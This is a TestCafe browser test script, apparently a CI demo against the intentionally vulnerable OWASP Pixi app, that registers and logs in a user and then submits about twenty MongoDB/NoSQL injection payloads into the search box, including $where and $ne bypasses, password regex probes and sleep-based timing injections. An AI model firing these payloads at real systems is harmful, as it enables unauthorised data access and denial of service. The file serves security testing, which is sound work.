// Evil MongoDB requests against Pixi directly for CI Pipeline (Demo)
import { Selector } from 'testcafe';

fixture`Getting Started`
    .page `http://172.17.0.1:8000/register`;

test('Register User', async t => {
    await t
        .typeText('input#email', 'testuser@pixi.owasp')
        .typeText('input#password', 'testpw')
        .click('body > div.jumbotron.jumbotron-fluid > div > div:nth-child(5) > div.col-8 > form > button')
        //After registration the search pixi field should be there
        //.expect('#search_query')
});

test('Login and Search', async t => {
    await t
	.click('body > div.jumbotron.jumbotron-fluid > div > div:nth-child(5) > div.col-4 > a:nth-child(3) > button')
        .typeText('input#user', 'testuser@pixi.owasp')
        .typeText('input#pass', 'testpw')
	.click('body > div.jumbotron.jumbotron-fluid > div > div:nth-child(5) > div.col-8 > form > button')
        //After login we search for Lunch
        .typeText('#search_query', 'true, $where: \'1 == 1\'')
        .pressKey('enter')
        .typeText('#search_query', ', $where: \'1 == 1\'')
        .pressKey('enter')
        .typeText('#search_query', '$where: \'1 == 1\'')
        .pressKey('enter')
        .typeText('#search_query', '\', $where: \'1 == 1\'')
        .pressKey('enter')
        .typeText('#search_query', '1, $where: \'1 == 1\'')
        .pressKey('enter')
        .typeText('#search_query', '{ $ne: 1 }')
        .pressKey('enter')
        .typeText('#search_query', '\', $or: [ {}, { \'a\':\'a')
        .pressKey('enter')
        .typeText('#search_query', '\' } ], $comment:\'successful MongoDB injection\'')
        .pressKey('enter')
        .typeText('#search_query', 'db.injection.insert({success:1});')
        .pressKey('enter')
        .typeText('#search_query', 'db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1')
        .pressKey('enter')
        .typeText('#search_query', '|| 1==1')
        .pressKey('enter')
        .typeText('#search_query', '\' && this.password.match(/.*/)//+%00')
        .pressKey('enter')
        .typeText('#search_query', '\' && this.passwordzz.match(/.*/)//+%00')
        .pressKey('enter')
        .typeText('#search_query', '\'%20%26%26%20this.password.match(/.*/)//+%00')
        .pressKey('enter')
        .typeText('#search_query', '\'%20%26%26%20this.passwordzz.match(/.*/)//+%00')
        .pressKey('enter')
        .typeText('#search_query', '{$gt: \'\'}')
        .pressKey('enter')
        .typeText('#search_query', '[$ne]=1')
        .pressKey('enter')
        .typeText('#search_query', '\';sleep(5000);')
        .pressKey('enter')
        .typeText('#search_query', '\';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);')
        .pressKey('enter')
        //.expect('body > div > div:nth-child(12) > div > div.card-deck')
});
